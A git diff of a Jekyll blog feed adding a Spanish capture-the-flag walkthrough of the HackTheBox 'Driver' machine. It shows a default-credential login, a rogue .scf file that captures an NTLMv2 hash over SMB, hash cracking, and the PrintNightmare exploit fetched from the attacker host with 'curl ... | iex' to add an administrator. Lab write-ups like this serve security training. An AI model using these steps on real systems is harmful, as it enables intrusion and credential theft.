@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-14T13:37:46-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolucion de CTFs y ciberseguridad.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-14T14:27:50-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolucion de CTFs y ciberseguridad.
 </subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - APT (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html" rel="alternate" type="text/html" title="HackTheBox - APT (insane)" /><published>2024-04-14T00:00:00-06:00</published><updated>2024-04-14T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/bbf0ca0388599663e0d8b6955a0760d3.png" />
 </p>
@@ -6391,4 +6391,2153 @@ C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
 <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
 56b547be1d0d3bd3405a6e44e23e164b
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Driver (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver.html" rel="alternate" type="text/html" title="HackTheBox - Driver (easy)" /><published>2024-04-07T00:00:00-06:00</published><updated>2024-04-07T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/ce42ce9fd28d117b8d6c045aefeb5cdb.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a estar haciendo la maquina Driver de la plataforma de Hack The Box después de usar credenciales por defecto en el servicio web podremos subir un archivo .scf para robar el hash ntlmv2 del usuario que esta por detrás revisando todo lo que suben, una vez crackeado el hash nos conectaremos con evil-winrm y para la escalada de privilegios explotaremos una vulnerabilidad que abusa de un printer driver que esta en la maquina victima y podremos agregar un usuario al grupo Administrators.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos con el escaneo de puertos abiertos y sus servicios para ver las tecnologías que están empleando.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,5985 10.129.250.229 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-02 19:06 CST
+Nmap scan report <span class="k">for </span>10.129.250.229
+Host is up <span class="o">(</span>0.51s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+| http-auth:
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for </span>admin
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb2-time:
+|   date: 2024-04-03T08:06:49
+|_  start_date: 2024-04-03T08:01:21
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+</span></code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Tenemos el puerto <strong>80</strong> abierto al parecer nos redirige a una pagina de <code class="language-plaintext highlighter-rouge">login</code> ya que en el escaneo nos da un <strong>401 Unauthorized</strong>.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">250.229</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">250.229</span> <span class="p">[</span><span class="mi">401</span> <span class="no">Unauthorized</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">250.229</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">25</span><span class="p">],</span> <span class="no">WWW</span><span class="o">-</span><span class="no">Authenticate</span><span class="p">[</span><span class="no">MFP</span> <span class="no">Firmware</span> <span class="no">Update</span> <span class="no">Center</span><span class="o">.</span> <span class="no">Please</span> <span class="n">enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">admin</span><span class="p">][</span><span class="no">Basic</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">25</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/driver/1.png" />
+</p>
+
+<ul>
+  <li>Si probamos con credenciales por defecto como <code class="language-plaintext highlighter-rouge">admin:admin</code> vemos que podemos entrar.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/driver/2.png" />
+</p>
+
+<h2 id="shell-as-tony">Shell as tony</h2>
+
+<ul>
+  <li>Si nos vamos al apartado de <strong>Firmware Updates</strong> vemos que podemos subir archivos y alguien lo va revisar ya con que nos digan eso podemos hacer un ataque para robar su <code class="language-plaintext highlighter-rouge">hash NTLMv2</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/driver/3.png" />
+</p>
+
+<ul>
+  <li>La mayoría de veces cuando puedes subir un archivo para robar un hash NTLMv2 es subir un <code class="language-plaintext highlighter-rouge">.scf</code> que este archivo hace referencia a un <code class="language-plaintext highlighter-rouge">icon</code> en un <code class="language-plaintext highlighter-rouge">SMB share</code> cuando un usuario abre la carpeta desde el Explorador de archivos intenta conectarse de vuelta para obtener un archivo de icono desde nuestro recurso compartido SMB gracias a esto obtendremos el hash de la victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>icon.scf
+<span class="o">[</span>Shell]
+<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.19<span class="se">\z</span>i<span class="se">\d</span>ame.ico
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ejecutamos el <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para ofrecer el recurso compartido y allí nos llegue el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver zi <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora subimos el archivo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/driver/4.png" />
+</p>
+
+<ul>
+  <li>Al subirlo nos llega el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver zi <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.250.229,49414<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>DRIVER<span class="se">\t</span>ony,DRIVER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DRIVER<span class="se">\t</span>ony authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> tony::DRIVER:aaaaaaaaaaaaaaaa:23bb0f7e862bb961d0a9575629a94420:010100000000000080a35aa66585da013f8e51d6f6f0512e00000000010010004f0046005a004a006a00480067004700030010004f0046005a004a006a00480067004700020010006500780041004500480047006e006d00040010006500780041004500480047006e006d000700080080a35aa66585da01060004000200000008003000300000000000000000000000002000002d6d666541de235278af71556e18b8f6cca24e3bc26bbfa175e94480b52e4e710a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003900000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:zi<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:zi<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.250.229,49414<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora simplemente crackeamos el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+liltony          <span class="o">(</span>tony<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2024-04-02 19:25<span class="o">)</span> 8.333g/s 264533p/s 264533c/s 264533C/s <span class="o">!!!!!!</span>..225566
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Verificamos que son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> <span class="s1">'tony'</span> <span class="nt">-p</span> <span class="s1">'liltony'</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\t</span>ony:liltony
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos el puerto de <code class="language-plaintext highlighter-rouge">smb</code> abierto podemos comprobar si tenemos acceso de escritura o del algún otro recurso compartido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> <span class="s1">'tony'</span> <span class="nt">-p</span> <span class="s1">'liltony'</span> <span class="nt">--shares</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\t</span>ony:liltony
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] Enumerated shares
+SMB         10.129.250.229  445    DRIVER           Share           Permissions     Remark
+SMB         10.129.250.229  445    DRIVER           <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.250.229  445    DRIVER           ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.250.229  445    DRIVER           C<span class="nv">$ </span>                             Default share
+SMB         10.129.250.229  445    DRIVER           IPC<span class="nv">$ </span>                           Remote IPC
+</code></pre></div></div>
+
+<ul>
+  <li>Pero no tenemos nada interesante algo que podemos hacer es ver si el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> para usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.250.229 <span class="nt">-u</span> <span class="s1">'tony'</span> <span class="nt">-p</span> <span class="s1">'liltony'</span>
+SMB         10.129.250.229  5985   DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 10240 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span>
+HTTP        10.129.250.229  5985   DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.250.229:5985/wsman
+WINRM       10.129.250.229  5985   DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\t</span>ony:liltony <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno podemos conectarnos y leer la <code class="language-plaintext highlighter-rouge">user flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.250.229 <span class="nt">-u</span> tony <span class="nt">-p</span> liltony
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>driver<span class="se">\t</span>ony
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+3bc6aa3a19aa59e9524f16993158ab66
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>
+    <p>Para enumerar el sistema podemos subir winPEASx64 <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f">https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f</a>.</p>
+  </li>
+  <li>
+    <p>Y lo subimos ala maquina.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe
+
+Info: Uploading /home/miguel/Hackthebox/Driver/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe
+
+Data: 3183272 bytes of 3183272 bytes copied
+
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Lo mas interesante de todo lo que nos reporto el script fue el historial de <code class="language-plaintext highlighter-rouge">Powershell</code> del usuario con el que estamos y encontramos que ejecuta 3 comandos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\u</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
+Add-Printer <span class="nt">-PrinterName</span> <span class="s2">"RICOH_PCL6"</span> <span class="nt">-DriverName</span> <span class="s1">'RICOH PCL6 UniversalDriver V4.23'</span> <span class="nt">-PortName</span> <span class="s1">'lpt1:'</span>
+
+ping 1.1.1.1
+ping 1.1.1.1
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que en el primero comando lo que esta intenta hacer es añadir una impresora, si buscamos vulnerabilidades para eso encontramos el siguiente <a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a> que lo que hace es que podemos crear un usuario Administrador donde nosotros indicamos el usuario y la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cloning into <span class="s1">'CVE-2021-1675'</span>...
+remote: Enumerating objects: 40, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>2/2<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 40 <span class="o">(</span>delta 1<span class="o">)</span>, reused 1 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 37
+Receiving objects: 100% <span class="o">(</span>40/40<span class="o">)</span>, 127.17 KiB | 458.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+➜  content <span class="nb">cd </span>CVE-2021-1675
+➜  CVE-2021-1675 git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
+</span>CVE-2021-1675.ps1  README.md  nightmare-dll
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo subimos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload CVE-2021-1675.ps1
+
+Info: Uploading /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1 to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1
+
+Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload CVE-2021-1675.ps1
+
+Info: Uploading /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1 to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1
+
+Data: 238080 bytes of 238080 bytes copied
+
+Info: Upload successful!
+</code></pre></div></div>
+
+<ul>
+  <li>Si importamos el modulo vemos que no podemos por una política definida en el sistema.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+File C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
+At line:1 char:1
++ Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a subirlo de otra forma.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Lo que podemos hacer es descargarlo con <code class="language-plaintext highlighter-rouge">curl</code> y usar <code class="language-plaintext highlighter-rouge">iex</code> o <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> además de usar el parámetro <code class="language-plaintext highlighter-rouge">-UseBasicParsing</code> que se utiliza con el <code class="language-plaintext highlighter-rouge">cmdlet</code> <code class="language-plaintext highlighter-rouge">Invoke-WebReques</code>t en <code class="language-plaintext highlighter-rouge">Porwershell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; curl 10.10.14.19:80/CVE-2021-1675.ps1 <span class="nt">-UseBasicParsing</span> | iex
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos añadir nuestro usuario <code class="language-plaintext highlighter-rouge">Administrador</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Invoke-Nightmare <span class="nt">-NewUser</span> migue
+lito <span class="nt">-NewPassword</span> miguel123
+<span class="o">[</span>+] created payload at C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
+<span class="o">[</span>+] using pDriverPath <span class="o">=</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\D</span><span class="s2">riverStore</span><span class="se">\F</span><span class="s2">ileRepository</span><span class="se">\n</span><span class="s2">tprint.inf_amd64_f66d9eed7e835e97</span><span class="se">\A</span><span class="s2">md64</span><span class="se">\m</span><span class="s2">xdwdrv.dll"</span>
+<span class="o">[</span>+] added user miguelito as <span class="nb">local </span>administrator
+<span class="o">[</span>+] deleting payload from C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora comprobamos que el usuario forme parte del grupo <code class="language-plaintext highlighter-rouge">Administrators</code> para poder conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; net user miguelito
+User name                    miguelito
+Full Name                    miguelito
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            4/3/2024 2:06:36 AM
+Password expires             Never
+Password changeable          4/3/2024 2:06:36 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *None
+The command completed successfully.
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> miguelito <span class="nt">-p</span> miguel123
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\m</span>iguelito:miguel123 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator-and-root-flag">Shell as Administrator and root flag</h2>
+
+<ul>
+  <li>Ahora ya simplemente nos conectamos y podemos leer la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.250.229 <span class="nt">-u</span> miguelito <span class="nt">-p</span> miguel123
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>iguelito<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+fce5289973391fd96a5db6dc2301f1cd
+</code></pre></div></div>
+
+<ul>
+  <li>En caso de que queramos conectarnos como el usuario <strong>Administrator</strong> simplemente podemos <code class="language-plaintext highlighter-rouge">dumpear</code> la <code class="language-plaintext highlighter-rouge">sam</code> y ver los hashes.</li>
+</ul>
+
